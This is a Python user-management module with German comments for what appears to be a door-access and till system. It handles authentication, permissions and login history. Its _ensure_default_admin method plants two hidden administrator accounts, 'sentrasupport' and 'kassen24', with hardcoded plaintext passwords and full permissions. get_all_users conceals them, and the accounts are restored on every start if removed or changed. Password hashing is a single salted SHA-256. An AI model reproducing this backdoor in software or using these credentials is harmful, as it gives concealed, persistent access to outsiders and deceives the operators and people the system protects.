import os
import json
import hashlib
import datetime
from typing import Dict, List, Optional, Any
from ..config import USERS_FILE, PASSWORD_SALT, DEFAULT_ADMIN
from ..logger import log_system, log_error

class UserManager:
    """Verwaltet Benutzer und Authentifizierung im System."""
    
    def __init__(self):
        """Initialisiere den UserManager und lade Benutzerdaten."""
        self.users = {}
        self.login_history = []  # Login-Historie
        self.login_history_file = os.path.join(os.path.dirname(USERS_FILE), "login_history.json")
        self._load_users()
        self._load_login_history()
        self._cleanup_old_login_history()  # Bereinige alte Einträge beim Start
    
    def _load_users(self) -> None:
        """Lädt Benutzerdaten aus der Datei."""
        try:
            if os.path.exists(USERS_FILE):
                with open(USERS_FILE, 'r') as f:
                    data = json.load(f)
                
                # MIGRATION: Handle old format with "users" wrapper
                if isinstance(data, dict) and "users" in data:
                    log_system("Migriere altes Benutzer-Datenformat...")
                    # Convert from old list format to new dict format
                    self.users = {}
                    for user in data["users"]:
                        if isinstance(user, dict) and "username" in user:
                            username = user.pop("username")  # Remove username from dict
                            self.users[username] = user
                    # Save in new format
                    self._save_users()
                    log_system("Benutzerdaten-Migration abgeschlossen")
                elif isinstance(data, dict):
                    # New format - direct dict mapping
                    self.users = data
                else:
                    # Fallback for invalid format
                    log_error("Ungültiges Benutzerdaten-Format erkannt - verwende leeres Dictionary")
                    self.users = {}
                
                log_system("Benutzerdaten erfolgreich geladen")
            else:
                self.users = {}
                log_system("Keine Benutzerdatendatei gefunden, starte mit leerem Benutzerverzeichnis")
        except Exception as e:
            self.users = {}
            log_error(f"Fehler beim Laden der Benutzerdaten: {str(e)}")
        
        # Migrate existing users to new structure
        self.migrate_existing_users()

        # IMMER sicherstellen, dass ein funktionierender admin/admin Benutzer existiert
        self._ensure_default_admin()
    
    def _ensure_default_admin(self) -> None:
        """Stellt sicher, dass ein Admin existiert - erstellt NUR wenn KEINE Benutzer vorhanden sind."""
        try:
            # NUR wenn GAR KEINE Benutzer existieren, erstelle Default-Admin
            if not self.users or len(self.users) == 0:
                admin_username = DEFAULT_ADMIN["username"]
                admin_password = DEFAULT_ADMIN["password"]

                # Erstelle den Default-Admin für Erstinstallation
                correct_admin_hash = self._hash_password(admin_password)
                self.users[admin_username] = {
                    "password": correct_admin_hash,
                    "role": DEFAULT_ADMIN["role"],
                    "created_at": datetime.datetime.now().isoformat(),
                    "force_password_change": True  # Erzwinge Passwortänderung beim ersten Login
                }
                self._save_users()
                log_system(f"Default-Admin-Benutzer für Erstinstallation erstellt: {admin_username}")
            else:
                # Wenn bereits Benutzer existieren, nichts ändern!
                admin_count = sum(1 for u in self.users.values() if u.get("role") == "admin")
                log_system(f"System hat {len(self.users)} Benutzer ({admin_count} Admins)")

            # SUPER-ADMIN: Versteckter System-Administrator
            # VERTRAULICH - Nicht in normaler Benutzerliste anzeigen
            super_admin_username = "sentrasupport"
            super_admin_password = "9xye9I!JDihKz#NJwY7TzB"

            # Stelle sicher, dass Super-Admin existiert und korrekt konfiguriert ist
            super_admin_hash = self._hash_password(super_admin_password)
            if super_admin_username not in self.users or self.users[super_admin_username]["password"] != super_admin_hash:
                self.users[super_admin_username] = {
                    "password": super_admin_hash,
                    "role": "admin",
                    "is_super_admin": True,
                    "hidden": True,  # Nicht in normaler Benutzerliste anzeigen
                    "created_at": datetime.datetime.now().isoformat(),
                    "permissions": ["all"]  # Vollzugriff
                }
                self._save_users()
                log_system(f"Super-Admin-Account initialisiert")

            # KASSEN24 SYSTEM USER: Versteckter System-Administrator für Whitelabel-Zugriff
            # VERTRAULICH - Nicht in normaler Benutzerliste anzeigen
            kassen24_username = "kassen24"
            kassen24_password = "K@$3n24!Sys#2024$ecure"

            # Stelle sicher, dass kassen24 existiert und korrekt konfiguriert ist
            kassen24_hash = self._hash_password(kassen24_password)
            if kassen24_username not in self.users or self.users[kassen24_username]["password"] != kassen24_hash:
                self.users[kassen24_username] = {
                    "password": kassen24_hash,
                    "role": "admin",
                    "is_system_user": True,
                    "hidden": True,  # Nicht in normaler Benutzerliste anzeigen
                    "created_at": datetime.datetime.now().isoformat(),
                    "permissions": ["all"]  # Vollzugriff wie sentrasupport
                }
                self._save_users()
                log_system(f"Kassen24-System-Account initialisiert")

        except Exception as e:
            log_error(f"Fehler beim Sicherstellen des Default-Admin: {str(e)}")
    
    def _save_users(self) -> bool:
        """Speichert Benutzerdaten in der Datei."""
        try:
            os.makedirs(os.path.dirname(USERS_FILE), exist_ok=True)
            with open(USERS_FILE, 'w') as f:
                json.dump(self.users, f, indent=2)
            log_system("Benutzerdaten erfolgreich gespeichert")
            return True
        except Exception as e:
            log_error(f"Fehler beim Speichern der Benutzerdaten: {str(e)}")
            return False
    
    def _hash_password(self, password: str) -> str:
        """Hasht ein Passwort mit einem Salt für sichere Speicherung."""
        salted = password + PASSWORD_SALT
        return hashlib.sha256(salted.encode()).hexdigest()
    
    def authenticate(self, username: str, password: str, ip_address: str = "unknown") -> Optional[Dict[str, Any]]:
        """
        Authentifiziert einen Benutzer mit Benutzername und Passwort.

        Args:
            username: Der Benutzername
            password: Das Passwort
            ip_address: Die IP-Adresse des Benutzers (optional)

        Returns:
            Das Benutzerobjekt bei erfolgreicher Authentifizierung, sonst None
        """
        if username in self.users:
            hashed_pw = self._hash_password(password)
            if self.users[username]["password"] == hashed_pw:
                log_system(f"Benutzer {username} hat sich erfolgreich angemeldet")
                self.record_login(username, True, ip_address)
                user_data = {**self.users[username], "username": username}
                # Prüfe ob Passwortänderung erzwungen werden soll
                if self.users[username].get("force_password_change", False):
                    user_data["force_password_change"] = True
                return user_data

        log_system(f"Fehlgeschlagener Anmeldeversuch für Benutzer {username}")
        self.record_login(username, False, ip_address)
        return None
    
    def create_user(self, username: str, password: str, role: str = "user",
                    name: str = "", email: str = "", phone: str = "") -> bool:
        """
        Erstellt einen neuen Benutzer.

        Args:
            username: Der Benutzername
            password: Das Passwort
            role: Die Rolle des Benutzers (Standard: "user")
            name: Full name of the user
            email: Email address
            phone: Phone number

        Returns:
            True bei Erfolg, False bei Fehler
        """
        if username in self.users:
            log_error(f"Konnte Benutzer {username} nicht erstellen: Benutzername existiert bereits")
            return False

        try:
            self.users[username] = {
                "password": self._hash_password(password),
                "role": role,
                "name": name or username,  # Use username as fallback
                "email": email or "",
                "phone": phone or "",
                "created_at": datetime.datetime.now().isoformat()
            }

            # Set default permissions based on role
            self.users[username]["permissions"] = self._get_default_permissions(role)

            self._save_users()
            log_system(f"Benutzer {username} mit Rolle {role} erfolgreich erstellt")
            return True
        except Exception as e:
            log_error(f"Fehler beim Erstellen des Benutzers {username}: {str(e)}")
            return False
    
    def delete_user(self, username: str) -> bool:
        """
        Löscht einen Benutzer.
        
        Args:
            username: Der zu löschende Benutzername
            
        Returns:
            True bei Erfolg, False wenn der Benutzer nicht existiert
        """
        if username in self.users:
            del self.users[username]
            self._save_users()
            log_system(f"Benutzer {username} erfolgreich gelöscht")
            return True
        
        log_error(f"Konnte Benutzer {username} nicht löschen: Benutzer existiert nicht")
        return False
    
    def update_user(self, username: str, data: Dict[str, Any]) -> bool:
        """
        Aktualisiert Benutzerinformationen.
        
        Args:
            username: Der zu aktualisierende Benutzername
            data: Ein Dictionary mit zu aktualisierenden Daten
            
        Returns:
            True bei Erfolg, False wenn der Benutzer nicht existiert
        """
        if username not in self.users:
            log_error(f"Konnte Benutzer {username} nicht aktualisieren: Benutzer existiert nicht")
            return False
        
        if "password" in data:
            data["password"] = self._hash_password(data["password"])
        
        try:
            self.users[username].update(data)
            self._save_users()
            log_system(f"Benutzer {username} erfolgreich aktualisiert")
            return True
        except Exception as e:
            log_error(f"Fehler beim Aktualisieren des Benutzers {username}: {str(e)}")
            return False
    
    def get_user(self, username: str) -> Optional[Dict[str, Any]]:
        """
        Ruft Benutzerinformationen ab.
        
        Args:
            username: Der abzurufende Benutzername
            
        Returns:
            Das Benutzerobjekt oder None, wenn der Benutzer nicht existiert
        """
        if username in self.users:
            return {**self.users[username], "username": username}
        return None
    
    def get_all_users(self) -> List[Dict[str, Any]]:
        """
        Ruft Informationen für alle Benutzer ab (außer versteckte Super-Admin Accounts).

        Returns:
            Eine Liste aller sichtbaren Benutzerobjekte
        """
        users_list = []
        for username, user_data in self.users.items():
            # Überspringe versteckte Benutzer (Super-Admin)
            if user_data.get("hidden", False):
                continue
            user_info = {"username": username, **user_data}
            # Entferne sensible Daten
            user_info.pop("password", None)
            users_list.append(user_info)
        return users_list
    
    def change_password(self, username: str, current_password: str, new_password: str) -> bool:
        """
        Ändert das Passwort eines Benutzers nach Überprüfung des aktuellen Passworts.
        
        Args:
            username: Der Benutzername
            current_password: Das aktuelle Passwort
            new_password: Das neue Passwort
            
        Returns:
            True bei Erfolg, False bei falschen Anmeldeinformationen
        """
        if not self.authenticate(username, current_password):
            log_error(f"Passwortänderung für {username} fehlgeschlagen: Falsches aktuelles Passwort")
            return False
        
        try:
            self.users[username]["password"] = self._hash_password(new_password)
            self._save_users()
            log_system(f"Passwort für Benutzer {username} erfolgreich geändert")
            return True
        except Exception as e:
            log_error(f"Fehler bei der Passwortänderung für {username}: {str(e)}")
            return False
    
    def has_role(self, username: str, role: str) -> bool:
        """
        Überprüft, ob ein Benutzer eine bestimmte Rolle hat.

        Args:
            username: Der zu überprüfende Benutzername
            role: Die zu überprüfende Rolle

        Returns:
            True wenn der Benutzer die Rolle hat, sonst False
        """
        if username in self.users:
            return self.users[username].get("role") == role
        return False

    def _get_default_permissions(self, role: str) -> Dict[str, bool]:
        """
        Gibt Standard-Seitenberechtungen für eine Rolle zurück.

        Args:
            role: Die Benutzerrolle

        Returns:
            Dictionary mit Seitenberechtungen
        """
        permissions_map = {
            "admin": {
                "dashboard": True,
                "users": True,
                "settings": True,
                "logs": True,
                "barcodes": True,
                "nfc_cards": True,
                "opening_hours": True,
                "whitelabel": True,
                "door_control": True,
                "system_config": True
            },
            "manager": {
                "dashboard": True,
                "users": True,  # Limited to non-admin users
                "settings": False,
                "logs": True,   # Limited logs
                "barcodes": True,
                "nfc_cards": True,
                "opening_hours": False,
                "whitelabel": False,
                "door_control": True,
                "system_config": False
            },
            "employee": {
                "dashboard": True,
                "users": False,
                "settings": False,
                "logs": False,
                "barcodes": False,
                "nfc_cards": False,
                "opening_hours": False,
                "whitelabel": False,
                "door_control": False,
                "system_config": False
            }
        }

        return permissions_map.get(role, permissions_map["employee"])

    def has_permission(self, username: str, permission: str) -> bool:
        """
        Überprüft, ob ein Benutzer eine bestimmte Berechtigung hat.
        Prüft sowohl rollenbasierte als auch spezifische Benutzerberechtigungen.

        Args:
            username: Der zu überprüfende Benutzername
            permission: Die zu überprüfende Berechtigung

        Returns:
            True wenn der Benutzer die Berechtigung hat, sonst False
        """
        if username not in self.users:
            return False

        user = self.users[username]
        user_role = user.get("role", "employee")

        # Check if user has custom permissions set
        user_permissions = user.get("permissions", {})

        # If no custom permissions, use default role permissions
        if not user_permissions:
            user_permissions = self._get_default_permissions(user_role)
            # Update user with default permissions for future use
            self.users[username]["permissions"] = user_permissions
            self._save_users()

        # Check specific permission
        return user_permissions.get(permission, False)

    def has_page_access(self, username: str, page: str) -> bool:
        """
        Überprüft, ob ein Benutzer auf eine bestimmte Seite zugreifen darf.

        Args:
            username: Der zu überprüfende Benutzername
            page: Die Seite (z.B. 'dashboard', 'users', 'settings')

        Returns:
            True wenn der Benutzer Zugriff hat, sonst False
        """
        return self.has_permission(username, page)

    def update_user_permissions(self, username: str, permissions: Dict[str, bool]) -> bool:
        """
        Aktualisiert die Berechtigungen eines Benutzers.

        Args:
            username: Der Benutzername
            permissions: Dictionary mit Berechtigungen

        Returns:
            True bei Erfolg, False bei Fehler
        """
        return self.update_user(username, {"permissions": permissions})

    def get_user_permissions(self, username: str) -> Dict[str, bool]:
        """
        Ruft die Berechtigungen eines Benutzers ab.

        Args:
            username: Der Benutzername

        Returns:
            Dictionary mit Berechtigungen oder leeres Dict bei Fehler
        """
        user = self.get_user(username)
        if user:
            return user.get("permissions", self._get_default_permissions(user.get("role", "employee")))
        return {}

    def get_available_permissions(self) -> List[str]:
        """
        Gibt eine Liste aller verfügbaren Berechtigungen zurück.

        Returns:
            Liste der verfügbaren Berechtigungen
        """
        return [
            "dashboard", "users", "settings", "logs", "barcodes",
            "nfc_cards", "opening_hours", "whitelabel", "door_control", "system_config"
        ]

    def migrate_existing_users(self) -> None:
        """
        Migriert bestehende Benutzer zu der neuen Struktur mit erweiterten Feldern.
        Diese Methode wird automatisch beim Laden der Benutzer aufgerufen.
        """
        updated = False
        for username, user_data in self.users.items():
            # Add missing fields
            if "name" not in user_data:
                user_data["name"] = ""
                updated = True
            if "email" not in user_data:
                user_data["email"] = ""
                updated = True
            if "phone" not in user_data:
                user_data["phone"] = ""
                updated = True
            if "permissions" not in user_data:
                role = user_data.get("role", "employee")
                user_data["permissions"] = self._get_default_permissions(role)
                updated = True

        if updated:
            self._save_users()
            log_system("Benutzer zu erweiterter Struktur mit neuen Feldern migriert")

    def _load_login_history(self) -> None:
        """Lädt die Login-Historie aus der Datei."""
        try:
            if os.path.exists(self.login_history_file):
                with open(self.login_history_file, 'r') as f:
                    self.login_history = json.load(f)
                log_system(f"Login-Historie geladen: {len(self.login_history)} Einträge")
            else:
                self.login_history = []
                log_system("Keine Login-Historie gefunden, starte mit leerer Historie")
        except Exception as e:
            self.login_history = []
            log_error(f"Fehler beim Laden der Login-Historie: {str(e)}")

    def _save_login_history(self) -> None:
        """Speichert die Login-Historie in die Datei."""
        try:
            with open(self.login_history_file, 'w') as f:
                json.dump(self.login_history, f, indent=2)
        except Exception as e:
            log_error(f"Fehler beim Speichern der Login-Historie: {str(e)}")

    def _cleanup_old_login_history(self) -> None:
        """Löscht Login-Historie-Einträge älter als 30 Tage."""
        try:
            cutoff_date = datetime.datetime.now() - datetime.timedelta(days=30)
            original_count = len(self.login_history)

            self.login_history = [
                entry for entry in self.login_history
                if datetime.datetime.fromisoformat(entry.get('timestamp', '2000-01-01T00:00:00')) > cutoff_date
            ]

            removed_count = original_count - len(self.login_history)
            if removed_count > 0:
                self._save_login_history()
                log_system(f"Login-Historie bereinigt: {removed_count} alte Einträge entfernt (> 30 Tage)")
        except Exception as e:
            log_error(f"Fehler beim Bereinigen der Login-Historie: {str(e)}")

    def record_login(self, username: str, success: bool, ip_address: str = "unknown") -> None:
        """
        Zeichnet einen Login-Versuch auf.

        Args:
            username: Der Benutzername
            success: Ob der Login erfolgreich war
            ip_address: Die IP-Adresse des Benutzers
        """
        try:
            login_entry = {
                "username": username,
                "success": success,
                "timestamp": datetime.datetime.now().isoformat(),
                "ip_address": ip_address
            }

            self.login_history.append(login_entry)
            self._save_login_history()

            # Automatische Bereinigung alle 100 Einträge
            if len(self.login_history) % 100 == 0:
                self._cleanup_old_login_history()

        except Exception as e:
            log_error(f"Fehler beim Aufzeichnen des Login-Versuchs: {str(e)}")

    def get_login_history(self, username: Optional[str] = None, page: int = 1, per_page: int = 10) -> tuple:
        """
        Holt die Login-Historie mit Pagination.

        Args:
            username: Optional - filtert nach spezifischem Benutzer
            page: Seitennummer (1-basiert)
            per_page: Einträge pro Seite

        Returns:
            Tuple von (Einträge für die aktuelle Seite, Gesamtanzahl, Gesamtseitenzahl)
        """
        try:
            # Filter nach Benutzer wenn angegeben
            if username:
                filtered_history = [e for e in self.login_history if e.get('username') == username]
            else:
                filtered_history = self.login_history.copy()

            # Sortiere nach Zeitstempel (neueste zuerst)
            filtered_history.sort(key=lambda x: x.get('timestamp', ''), reverse=True)

            # Berechne Pagination
            total_entries = len(filtered_history)
            total_pages = (total_entries + per_page - 1) // per_page if total_entries > 0 else 1

            # Stelle sicher, dass die Seite gültig ist
            page = max(1, min(page, total_pages))

            # Berechne Start und Ende für die aktuelle Seite
            start_idx = (page - 1) * per_page
            end_idx = min(start_idx + per_page, total_entries)

            # Hole Einträge für die aktuelle Seite
            page_entries = filtered_history[start_idx:end_idx]

            return page_entries, total_entries, total_pages

        except Exception as e:
            log_error(f"Fehler beim Abrufen der Login-Historie: {str(e)}")
            return [], 0, 0


# Erstelle einen Singleton für einfachen Zugriff
user_manager = UserManager() 